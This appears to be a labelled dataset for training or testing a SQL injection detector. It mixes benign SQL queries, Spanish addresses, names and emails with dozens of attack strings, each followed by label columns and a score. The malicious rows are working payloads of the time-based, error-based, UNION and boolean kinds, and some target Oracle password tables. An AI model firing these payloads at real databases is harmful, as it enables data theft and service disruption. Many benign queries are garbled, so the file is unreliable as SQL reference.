"1'||  (  select 'sned' where 4957  =  4957 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
40133,0,0,0.004468253314358248
"-5411%""   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,1,1,1.0
8i4trib7ti5a,0,0,0.004468253314358248
caada del hoyo,0,0,0.0
6.71628e+15,0,0,0.0
28177i6sa,0,0,0.004468253314358248
select * from lot where present not like '[ever]%',0,0,0.0
select * from customers  where customername like 'a%';,0,0,0.0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'xlvt'  =  'xlvt",1,1,1.0
calle bertran de castellet 28 6e,0,0,0.0
"1' or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
espineta astorquiza,0,0,0.004468253314358248
"1%""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
"c/ montealegre s/n, 9-b",0,0,0.0
select * from giant where forget = 'naturally'  and city = 'view',0,0,0.0
"1""   )    )    and elt  (  6553  =  4771,4771  )   and    (    (   ""eolu""  =  ""eolu",1,1,1.0
halim,0,0,0.004468253314358248
"1'  )   as pkis where 3446  =  3446 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1,1,1.0
" select * from blank order by death, what",0,0,0.0
select die ( s )  from great,0,0,0.0
select top 50 percent * from cook,0,0,0.0
"c/ salvatella, 98 11?h",0,0,0.0
4.28192e+15,0,0,0.0
trbena,0,0,0.004468253314358248
select * from customers   where customername not like 'a%';,0,0,0.0
priaranza del bierzo,0,0,0.0
latin,0,0,0.004468253314358248
"select * from generate_series  (  2317,2317,case when   (  2317  =  9706  )   then 1 else 0 end  )   limit 1--",1,1,1.0
"1%'   )    )    and elt  (  4483  =  5364,5364  )   and    (    (   '%'  =  '",1,1,1.0
-4538'   )    )     )   or 3260  =  1236 and    (    (     (  'hpnd' like 'hpnd,1,1,1.0
select * from basic where please between '1996-07-01' and '1996-07-31',0,0,0.0
"-1844"" where 7948  =  7948 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,1.0
or 'a'  =  'a,1,1,0.99
cedric,0,0,0.004468253314358248
" select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",1,1,1.0
"1""   )    )    as tpeh where 6306  =  6306 and 5965  =  5806#",1,1,1.0
select top 3 * from minerals where nails = 'direction',0,0,0.0
" end and    (    (   ""kvts"" like ""kvts",1,1,1.0
"1   )    )     )   union all select null,null,null,null,null--",1,1,1.0
select min ( handsome )  as gray from food,0,0,0.0
"c/ antonia lancha, 38, 1?h",0,0,0.06
"1""  )   where 2702  =  2702 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,1,1.0
"-3361 where 1335  =  1335 or elt  (  5891  =  5092,5092  )  --",1,1,1.0
sim5e469,0,0,0.004468253314358248
select avg ( moment ) from plant select sum ( shake ) ,0,0,0.0
select * from feed where decide = 'promised' fetch first 3 rows only,0,0,0.0
"1'  )   where 9226  =  9226 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
select * from  ( select beginning from gold ) ,0,0,0.0
"1'   )    )    as hrra where 9533  =  9533 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
from  ( select distinct bend from village ) ,0,0,0.0
1'||  (  select 'rdqv' from dual where 1894  =  1894,1,1,1.0
"1  )   and make_set  (  4593  =  7765,7765  )   and   (  8517  =  8517",1,1,1.0
"rua bamio, 190 11?h",0,0,0.0
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",1,1,1.0
1'  )   and   (  1414  =  4775  )  *4775 and   (  'mlmw'  =  'mlmw,1,1,1.0
"1'||  (  select 'mgel' where 3591  =  3591 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",1,1,1.0
select * from bank  where riding not like '[chair]%',0,0,0.0
select * from zulu where respect like '%death%',0,0,0.0
select top 50 percent * from phrase select * from loud fetch first 50 percent rows onlyselect top 3 * from able,0,0,0.0
select * from orderswhere orderdate between '1996-07-01' and '1996-07-31';,0,0,0.02
nuez de balboa 131 2-f,0,0,0.0
select * from deep fetch first 3 rows only,0,0,0.0
rascel-byatt@discotecateatre.ug,0,0,0.006527024015406931
select shorter from long union all select move from easily order by party,0,0,0.0
"1""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
"   select here, organized+ ', ' + claws+ ' ' + teacher+ ', ' + respect as count  from leaf",0,0,0.01
"1' where 4039  =  4039 union all select null,null,null,null,null,null,null,null--",1,1,1.0
1 rlike sleep  (  5  ) ,1,1,0.98
select * from mass where not little = 'harder'  and not share = 'automobile',0,0,0.0
select * from chose,0,0,0.0
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz",1,1,1.0
"   select cause,may,yesterday,cookies,fill     (  (  upper join common on tide.facing =  brain.object )   inner join blowon orders.notice =  inch.sangid ) ",0,0,0.0
"c/ bailen 8,",0,0,0.0
sorts bransuel,0,0,0.004468253314358248
"1,  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",1,1,0.99
select top 50 percent * from his,0,0,0.0
insert,1,0,0.004038575161930648
senderow,0,0,0.004468253314358248
"  select worker as cabin, broad as [torn]  from breathe",0,0,0.0
"  select orders.hiddenrid, employees.bone, employees.safe from ordersright join employees on orders.employeeid  =  employees.planid order by orders.frequentlyid",0,0,0.0
wildt_feng-chiao@paseotuperro.ke,0,0,0.006527024015406931
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'fbnx'  =  'fbnx",1,1,1.0
1'+  (  select 'feof' where 1966  =  1966,1,1,1.0
select * from particular where television = 'say' limit 3,0,0,0.0
2813,0,0,0.004468253314358248
select min ( piano )  as voyage from experiment,0,0,0.0
"1'+  (  select 'ples' where 4244  =  4244 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",1,1,1.0
6310,0,0,0.004468253314358248
select guide ( s )  from baseball select war ( s ) ,0,0,0.0
select * from chart fetch first 3 rows only select top 50 percent * from should,0,0,0.0
almoharn,0,0,0.004468253314358248
select * from scientific where stage like '%happy%',0,0,0.0
select top 3 * from replied where fill = 'ordinary',0,0,0.0
ozoa cadaveira,0,0,0.004468253314358248
select count ( distinct environment )  from metal,0,0,0.0
"-2394'  )   union all select 1650,1650,1650,1650,1650,1650,1650--",1,1,1.0
seno,0,0,0.004468253314358248
select * from kill fetch first 3 rows only select top 50 percent * from smooth,0,0,0.0
select * from dance order by dark,0,0,0.0
select * from kill fetch first 3 rows only,0,0,0.0
select count ( just )  from shoe,0,0,0.0
bic9spide,0,0,0.004468253314358248
select * from ill where biggest = 'nor',0,0,0.0
"-5672%"" or 3825  =  9675--",1,1,1.0
select top 3 * from danger where rocky = 'better',0,0,0.0
"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1,1,1.0
"1""  )   where 4426  =  4426 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,1.0
" select * from users where id  =  1 +\. union select null,@@version -- 1",1,1,1.0
select * from grew where lion = 'diameter'  or attempt = 'broken',0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 367845 )  order by meta_id asc",0,0,0.0
"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",1,1,1.0
"  select situation as evidence, customs as [policeman]  from fight",0,0,0.0
"-9697  )   union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--",1,1,1.0
74,0,0,0.004468253314358248
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""plqe""  =  ""plqe",1,1,1.0
select top 3 * from result,0,0,0.0
coe,0,0,0.004468253314358248
select top 50 percent * from choice,0,0,0.0
select top 3 * from review,0,0,0.0
select * from fighting where worth = 'rock' limit 3,0,0,0.0
"1""  )   where 2016  =  2016 and   (  1547  =  2093  )  *2093--",1,1,1.0
c/ marquesa de vilallonga 53 5f,0,0,0.0
"1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'nazb'  =  'nazb",1,1,1.0
1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,0.99
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  username  )   from   (  select distinct  (  username  )  , rownum as limit from sys.all_users  )   where limit  =  4   )    )    and 'i'  =  'i",1,1,1.0
legrandv,0,0,0.004468253314358248
"1  )   as svkf where 6503  =  6503 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
select * from know where go = 'entirely',0,0,0.0
select * from rather 3 select * from prove,0,0,0.0
select * from butter where within between not09/01/1996border and birds15/31/1996vertical,0,0,0.0
retallac,0,0,0.004468253314358248
select * from prove,0,0,0.0
select * from  ( select hollow from actual ) ,0,0,0.0
-5500'  )   order by 1--,1,1,1.0
"1  )   as cejp where 4736  =  4736 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
select pupil ( s from root right join,0,0,0.0
select listen ( s )  from courage select eaten from his,0,0,0.0
select citizen ( s )  from news select distant from hall,0,0,0.0
28721,0,0,0.004468253314358248
"-5014%""   )    )     )   or 3348  =  2430--",1,1,1.0
select top 3 * from somehow,0,0,0.0
select laugh from angry,0,0,0.0
alises,0,0,0.004468253314358248
select * from idea where improve  between 10 and 20,0,0,0.0
from  ( select distinct string from excellent ) ,0,0,0.0
select min ( recent )  as bring from sense,0,0,0.0
select body ( s )  from statement full outer join,0,0,0.0
select count ( worryid ) from dog,0,0,0.0
"1'||  (  select 'eayf' where 5431  =  5431 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",1,1,1.0
"1%""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""%""  =  """,1,1,1.0
"c/ concepcion alexandre 82,",0,0,0.0
"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,1,1,1.0
38726,0,0,0.004468253314358248
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""unju""  =  ""unju",1,1,1.0
gaile,0,0,0.004468253314358248
"  select time_format ( ""19:30:10"", ""%r"" ) ;",0,0,0.03
san miguel del pino,0,0,0.0
"  select placeid as id, fix as held from early",0,0,0.0
"1%'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   '%'  =  '",1,1,1.0
select * from pot where bring not between 'crowd' and 'dry',0,0,0.0
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  username  )   from   (  select distinct  (  username  )  , rownum as limit from sys.all_users  )   where limit  =  3   )    )    and 'i'  =  'i",1,1,1.0
mundy,0,0,0.004468253314358248
"1  )   where 7881  =  7881 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
"   select employees.oldest, count ( orders.wholeid )  as racefrom    ( ordersinner join close on orders.chanceid  =  employees.scaleid ) ",0,0,0.0
select * from rapidly where fairly not like 'stairs%',0,0,0.0
"1%'   )    )    union all select null,null,null,null,null,null,null#",1,1,1.0
"select * from exchange where best between ""taught"" and    ""involved""",0,0,0.0
"1'+  (  select dagm where 5461  =  5461 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  +'",1,1,0.99
"insert into pole  ( earn, eat, corner )  values  ( 'harder', 'sun', 'plus' )  ",0,0,0.0
"pl. finlandia, 58, 7?d",0,0,5.009392611145898e-05
"1  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  8898  =  8898",1,1,1.0
"insert into example  ( count, from, nor )  values  ( 'blew', 'farm', 'silence' )  ",0,0,0.0
c632i6ela,0,0,0.004468253314358248
"1,  (  select   (  case when   (  1255  =  8025  )   then 1 else 1255*  (  select 1255 from mysql.db  )   end   )    )   ",1,1,1.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 287 )  order by meta_id asc",0,0,0.0
tas9go,0,0,0.004468253314358248
"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",1,1,1.0
" select * from buffalo order by lost asc, if desc",0,0,0.0
1'  )   where 5540  =  5540 waitfor delay '0:0:5'--,1,1,1.0
select * from wp_posts where id  =  347682 limit 1,0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 30710 )  order by meta_id asc",0,0,0.0
arrazua-ubarrundia,0,0,0.006527024015406931
777t1c4rio,0,0,0.004468253314358248
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  password  )   from   (  select distinct  (  password  )  , rownum as limit from sys.user$  )   where limit  =  7   )    )    and 'i'  =  'i",1,1,1.0
select distinct grain from child,0,0,0.0
"-9854%""   )    )     )   or 6455  =  3652",1,1,1.0
"   select count ( triangle ) , again from fruit by large",0,0,0.0
"  select trace as scientist, bus as [rod]  from bush",0,0,0.0
select avg ( price ) from products;,0,0,0.0
"puerta del sol 124, 8?h",0,0,0.0
"1"" where 2394  =  2394 and 8831  =  8333--",1,1,1.0
select * from select  where to = current,0,0,0.01
"1%'   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
com/is?-wzx-uhylezkniylvabkl3w4oh5f749nr2kumffjzou  <email_address>  <![cdata[elwoodbuckley@freenet,0,0,0.01012212631001442
inoportunamente,0,0,0.004468253314358248
select fine ( s )  from secret select sea from nails,0,0,0.0
select avg ( funny ) from early select sum ( monkey ) ,0,0,0.0
eyre9@ringringcargo.tn,0,0,0.004468253314358248
23550240b,0,0,0.004468253314358248
1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'toxr' like 'toxr,1,1,1.0
"  select richid as id, influence as rear from now",0,0,0.0
melosa,0,0,0.004468253314358248
7.50908e+15,0,0,0.0
select ceiling ( 25.75 ) ;,0,0,0.0
select avg ( attack ) from over,0,0,0.0
select * from building where shallow = 'aloud' fetch first 3 rows only,0,0,0.0
select * from dark where physical between '1996-07-01' and '1996-07-31',0,0,0.0
-7859  )   as ipdg where 4413  =  4413 or 9323  =  9323#,1,1,1.0
"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,1,1.0
"-2718""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""kbvd"" like ""kbvd",1,1,1.0
9.0515e+15,0,0,0.0
select distinct talk from unhappy,0,0,0.0
select count ( distinct kitchen )  from tired,0,0,0.0
select count ( distinct six )  from enemy,0,0,0.0
-5854   )    )     )   union all select 5645#,1,1,1.0
" select * from users where id  =  1 or @#""  (    =  1 union select 1,version  (    )   -- 1",1,1,1.0
select * from speed fetch first 50 percent rows only,0,0,0.0
pittman,0,0,0.004468253314358248
"select adddate ( ""2017-06-15"", interval -2 month ) ;",0,0,0.0
-9522  )   as lraw where 9472  =  9472 or   (  4087  =  8213  )  *8213--,1,1,0.99
"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'mnod'  =  'mnod",1,1,1.0
select * from sail where have not between 'people' and 'form',0,0,0.0
18611,0,0,0.004468253314358248
"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'lywy' like 'lywy",1,1,1.0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   6977  =  6977",1,1,1.0
select * from package where slip = 'dozen'  and city = 'palace',0,0,0.0
"-5150   )    )     )   union all select 5660,5660,5660#",1,1,1.0
"tres villas, las",0,0,0.004468253314358248
select * from simplest where amount between 'notice' and 'five',0,0,0.0
"   select employees.continent, count ( orders.parentid )  as settingfrom    ( ordersinner join more on orders.shadeid  =  employees.wheatid ) ",0,0,0.0
select * from weak where smaller not between 'unit' and 'dear',0,0,0.0
select * from copy where rough not like 'two%',0,0,0.0
"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""qnqb"" like ""qnqb",1,1,1.0
select characteristic ( s )  from hello,0,0,0.0
"   select warn, reach+ ', ' + firm+ ' ' + powerful+ ', ' + friendly as ago  from attack",0,0,0.0
"1""   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
" select * from users where id  =  1 or ""  (  ,""  =  1 or 1  =  1 -- 1",1,1,1.0
select * from wp_posts left join wp_postmeta on  (  wp_posts.id  =  wp_postmeta.post_id  )  where  ( post_type  =  'page' and post_status  =  'publish' )  and wp_postmeta.meta_key  =  '_wp_page_template' and wp_postmeta.meta_value  =  'template/template-compare.php' order by wp_posts.post_title asc,0,0,0.05
"1""   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  ""kfdh"" like ""kfdh",1,1,1.0
"1 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
"1'  )   where 7093  =  7093 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
"   select force, game, island from helpful where pine  is null",0,0,0.0
select   (  case when   (  3444  =  8424  )   then 3444 else 3444*  (  select 3444 from information_schema.character_sets  )   end  )  #,1,1,1.0
select count ( climate )  from attack,0,0,0.0
select * from composition where cookies not like 'useful%',0,0,0.0
-8777%'   )    )     )   or   (  3934  =  2025  )  *2025 and    (    (     (  '%'  =  ',1,1,1.0
 update exercise set arm = 'location'where stove = 'organized',0,0,0.0
select power ( s )  from correctly,0,0,0.0
select * from cream fetch first 50 percent rows only,0,0,0.0
select * from sale where forget = 'first',0,0,0.0
from  ( select distinct trunk from courage ) ,0,0,0.0
2639,0,0,0.004468253314358248
select avg ( last ) from tonight select sum ( make ) ,0,0,0.0
02879028a,0,0,0.004468253314358248
"   select count ( minute ) , office from mass by alive",0,0,0.0
"-9871""  )   union all select 9082#",1,1,1.0
select count ( impossibleid ) from belt,0,0,0.0
"calle sant joan, 123,",0,0,0.0
"-6170   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
10263,0,0,0.004468253314358248
select count ( my ) from wheel,0,0,0.0
abraham,0,0,0.004468253314358248
"-8797""   )    )    order by 1#",1,1,1.0
13421536r,0,0,0.004468253314358248
select * from people where desk like '%laid%',0,0,0.0
select * from group where figure = 'vapor' limit 3,0,0,0.0
karin,0,0,0.004468253314358248
"1'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'holo'  =  'holo",1,1,1.0
perih1lio,0,0,0.004468253314358248
select distinct weather from discussion,0,0,0.0
1'   )    )    and 7533  =  7533 and    (    (   'pagc' like 'pagc,1,1,1.0
"   select uncle, studying, jumpfrom for where from  is not null",0,0,0.0
select * from keep  where attached = gate,0,0,0.0
 update block set village = 'pleasure'where knowledge = 'during',0,0,0.0
select avg ( price ) from chief,0,0,0.0
vicens,0,0,0.004468253314358248
ase,0,0,0.004468253314358248
"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",1,1,1.0
1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,1,1,1.0
"-7258 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
"-1591 where 3291  =  3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#",1,1,1.0
61882626e,0,0,0.004468253314358248
select avg ( price ) from seeing,0,0,0.0
"1%""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""%""  =  """,1,1,1.0
"-4233%""  )   or   (  8459  =  8459  )  *4906 and   (  ""%""  =  """,1,1,1.0
6131,0,0,0.004468253314358248
1   )    )    as vmwj where 5597  =  5597,1,1,1.0
"   select cattle, post, sidesfrom breathing where tropical  is not null",0,0,0.0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'hvqt'  =  'hvqt",1,1,1.0
niel5,0,0,0.004468253314358248
select avg ( clear )  from problem  select sum ( plane ) ,0,0,0.0
select * from mix where    not die = 'ask',0,0,0.0
1   )    )    as ztcn where 1043  =  1043 and 6305  =  5785--,1,1,1.0
"1"" where 4281  =  4281",1,1,1.0
"1%""  )   and 8715  =  5529",1,1,1.0
"1""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""gfwz""  =  ""gfwz",1,1,1.0
"1  )   where 1415  =  1415 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,1,1.0
select top 50 percent * from walk select * from shelf fetch first 50 percent rows onlyselect top 3 * from proud,0,0,0.0
37159,0,0,0.004468253314358248
skylar,0,0,0.004468253314358248
select * from with where dress = 'band' limit 3,0,0,0.0
"1""  )   where 4112  =  4112",1,1,1.0
-3059'  )   as jhbh where 4056  =  4056 or   (  3498  =  6965  )  *6965--,1,1,1.0
"1%"" or sleep  (  5  )  #",1,1,1.0
select avg ( truck ) from space,0,0,0.0
select avg ( either ) from result select sum ( slipped ) ,0,0,0.0
sleep 50',1,0,0.3603693283718226
"  select str_to_date ( ""august,5,2017"", ""%m %e %y"" ) ;",0,0,0.07
select clearly ( s )  from massage select double ( s ) ,0,0,0.0
" select column_name ( s )  from pound,bet",0,0,0.0
"   select employees.familiar, count ( orders.grainid )  as tapefrom    ( ordersinner join introduced on orders.youthid  =  employees.fingerid ) ",0,0,0.0
select * from dollar where appropriate between '1996-07-01' and '1996-07-31',0,0,0.0
select min ( spell )  as paid from essential,0,0,0.0
manganear,0,0,0.004468253314358248
select avg ( thee ) from language select sum ( friend ) ,0,0,0.0
open3,0,0,0.004468253314358248
sureda bahamonde,0,0,0.004468253314358248
1   )    )    rlike   (  select   (  case when   (  6113  =  1222  )   then 1 else 0x28 end   )    )    and    (    (   2815  =  2815,1,1,1.0
"  select higherid as id, wagon as tree from seven",0,0,0.0
select avg ( chance ) from happily select sum ( blanket ) ,0,0,0.0
60613075w,0,0,0.004468253314358248
"1%'  )   union all select null,null,null,null,null,null,null,null,null,null--",1,1,1.0
"-6595   )    )     )   union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",1,1,1.0
"1'+  (  select 'ycvl' where 8415  =  8415 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
"insert into increase ( company, college, introduced, rain, metal, mood )  values  ( 'bowl', 'once'. second', 'him', 'ask', 'length', 'upward' )  ",0,0,0.0
select * from solar where known between 'declared' and 'nothing',0,0,0.0
nagyszeder.kehoe@creacionesacampada.es,0,0,0.004468253314358248
select * from for  where angry = answer,0,0,0.0
ellacott2,0,0,0.004468253314358248
select * from can where not brief = 'desk'  and not method = 'its',0,0,0.0
aguacella,0,0,0.004468253314358248
-7430'  )   as xfah where 1596  =  1596 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1,1,1.0
select count ( * )  as adult,0,0,0.0
select * from age order by thumb,0,0,0.0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1,1,0.99
"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",1,1,1.0
granyena de segarra,0,0,0.0
17590r,0,0,0.004468253314358248
" select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",1,1,1.0
select * from adjective where price not between 10 and 20,0,0,0.0
